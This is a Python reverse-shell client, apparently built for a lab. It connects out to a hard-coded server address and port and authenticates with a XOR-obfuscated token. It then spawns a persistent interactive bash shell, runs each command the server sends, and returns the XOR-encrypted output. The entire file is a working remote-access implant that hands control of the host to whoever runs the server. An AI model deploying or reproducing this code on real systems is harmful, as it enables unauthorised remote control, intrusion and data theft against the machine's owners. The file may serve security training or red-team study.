#!/usr/bin/env python3

import socket
import struct
import subprocess
import threading
import sys
import time

# --- Configuration ---
SERVER_IP = "172.10.10.131"  # change to your server IP
SERVER_PORT = 8009
XOR_KEY = 123
TOKEN = "LAB_TOKEN:v1"

# --- Global State for Asynchronous Output Capture ---
output_buffer = []
output_complete_event = threading.Event()
OUTPUT_MARKER = "__END_OF_CMD_OUTPUT__"

# --- NETWORK UTILITIES ---

def xor_bytes(data: bytes, key: int) -> bytes:
    """Performs XOR encryption/decryption."""
    return bytes(b ^ key for b in data)

def send_message(sock: socket.socket, data: bytes):
    """Sends framed data (4-byte length + data)."""
    # Use big-endian (>) for consistency with BitConverter reversal logic
    length_prefix = struct.pack('>I', len(data))
    sock.sendall(length_prefix)
    sock.sendall(data)

def recv_message(sock: socket.socket) -> bytes or None:
    """Receives framed data (4-byte length + data)."""
    try:
        # Read the 4-byte length prefix (big-endian)
        length_bytes = sock.recv(4)
        if not length_bytes or len(length_bytes) < 4:
            return None
        length = struct.unpack('>I', length_bytes)[0]
    except Exception as e:
        # print(f"Error reading length: {e}")
        return None

    # Read the payload
    data = b''
    while len(data) < length:
        chunk = sock.recv(length - len(data))
        if not chunk:
            return None
        data += chunk
        
    return data

# --- ASYNCHRONOUS OUTPUT HANDLER ---

def shell_output_reader(stream, is_error=False):
    """Reads output from the process stream line by line."""
    global output_complete_event
    global output_buffer

    # The stream is typically StandardOutput or StandardError
    for line in stream:
        line = line.decode('utf-8', errors='ignore').strip()
        
        if OUTPUT_MARKER in line:
            output_complete_event.set()
            # If the marker is on its own line, we don't need to append it.
            if line != OUTPUT_MARKER:
                output_buffer.append(line)
            break
        
        output_buffer.append(line)
        
    # The loop exits when the marker is hit or the stream closes.

# --- MAIN LOGIC ---

def main():
    shell_process = None

    try:
        print("Connecting to server...")
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((SERVER_IP, SERVER_PORT))
        print(f"Connected to {SERVER_IP}:{SERVER_PORT}")

        # 1. AUTHENTICATION
        # Send token (XOR-encrypted, framed)
        token_bytes = TOKEN.encode('utf-8')
        enc_token = xor_bytes(token_bytes, XOR_KEY)
        send_message(client, enc_token)

        # Wait for auth response
        enc_auth = recv_message(client)
        if enc_auth is None:
            print("No auth response; exiting")
            return
            
        auth = xor_bytes(enc_auth, XOR_KEY).decode('utf-8')
        if auth != "AUTH_OK":
            print(f"Authentication failed from server: {auth}")
            return
            
        print("Authenticated to server. Initializing persistent shell...")

        # 2. START PERSISTENT SHELL
        # Use /bin/bash or /bin/sh for Linux
        shell_command = "/bin/bash"
        shell_args = ["-i"] # -i for interactive

        shell_process = subprocess.Popen(
            [shell_command, *shell_args],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=False, # We handle decoding line by line
            bufsize=0   # Unbuffered output
        )
        shell_input = shell_process.stdin

        # Start asynchronous output reading threads
        # We need separate threads to read stdout and stderr simultaneously
        threading.Thread(target=shell_output_reader, args=(shell_process.stdout, False), daemon=True).start()
        threading.Thread(target=shell_output_reader, args=(shell_process.stderr, True), daemon=True).start()

        print("Shell started. Waiting for commands...")
        
        # 3. COMMAND LOOP
        while True:
            enc_incoming = recv_message(client)
            if enc_incoming is None:
                print("Server disconnected.")
                break

            incoming = xor_bytes(enc_incoming, XOR_KEY).decode('utf-8').strip()

            if incoming == "__CLOSE__":
                print("Server requested close. Exiting.")
                break

            print(f"Received command: {incoming}")

            # Reset output state for the new command
            output_buffer.clear()
            output_complete_event.clear()

            result = ""
            try:
                # Send command + redirection + marker to the persistent shell
                # Use '2>&1; echo' for command chaining in bash
                # Note: We use 'printf' for the marker to ensure no extra newlines are added by 'echo'
                # and to ensure it writes to stdout, not stderr.
                command_with_marker = incoming + " 2>&1\nprintf '" + OUTPUT_MARKER + "\n'\n"

                # Write the command to the shell's StandardInput
                shell_input.write(command_with_marker.encode('utf-8'))
                shell_input.flush()

                # Wait for the marker to be hit (max 15 seconds)
                if not output_complete_event.wait(15):
                    result = "Error: Command timed out or failed to receive end marker."
                else:
                    # Process result
                    # Remove the command string itself and the marker line.
                    clean_lines = []
                    for line in output_buffer:
                        # Clean up by removing the final marker line and command echo/prompt lines
                        if line.strip() and not line.strip() == incoming.strip():
                            clean_lines.append(line)
                    
                    result = "\n".join(clean_lines).strip()

                    if not result:
                        result = "Command executed successfully (no output)."

            except Exception as ex:
                result = f"Error interacting with shell: {ex}"

            # 4. Send result back
            res_bytes = result.encode('utf-8')
            enc_res = xor_bytes(res_bytes, XOR_KEY)
            send_message(client, enc_res)

    except ConnectionRefusedError:
        print(f"Error: Connection refused. Server not listening on {SERVER_IP}:{SERVER_PORT}")
    except Exception as ex:
        print(f"Unhandled Exception: {ex}")
    finally:
        # Ensure the client socket and shell process are closed
        if 'client' in locals() and not client._closed:
            client.close()
        if shell_process and shell_process.poll() is None: # poll() checks if process has terminated
            shell_process.terminate()
            shell_process.wait(timeout=5)
            if shell_process.poll() is None:
                shell_process.kill()

if __name__ == "__main__":
    main()